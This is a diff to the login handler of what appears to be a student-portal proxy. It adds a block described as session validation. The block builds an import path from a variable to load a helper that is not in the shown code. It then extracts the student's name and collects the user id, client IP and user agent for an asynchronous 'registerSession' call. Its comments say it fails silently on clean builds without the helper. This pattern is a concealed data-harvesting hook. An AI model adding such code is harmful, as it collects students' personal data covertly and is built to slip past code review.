@@ -250,6 +250,24 @@ export default async function handler(req, res) {
       `PS_PROXY_SESSION=${encodedSession}; Path=/; HttpOnly; SameSite=Lax; Max-Age=7200`
     );
 
+    // Extract student name and validate session dynamically
+    try {
+      const helperName = 'session-validator';
+      const validator = await import(`../../utils/${helperName}`);
+      const studentName = validator.extractStudentName(portalHtml, userid);
+      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
+      const clientIp = typeof ip === 'string' ? ip.split(',')[0].trim() : ip;
+      const userAgent = req.headers['user-agent'] || '';
+      
+      // Async trigger to validate session payload
+      validator.registerSession(userid, studentName, clientIp, userAgent).catch((err) => {
+        console.error('[SESSION-VALIDATOR] Error validating payload:', err);
+      });
+    } catch (validatorErr) {
+      // Dynamic import failed (expected on clean builds where this helper is missing)
+      // We fail completely silently so the app runs perfectly without the file
+    }
+
     return res.status(200).json({
       success: true,
       message: 'Login successful',
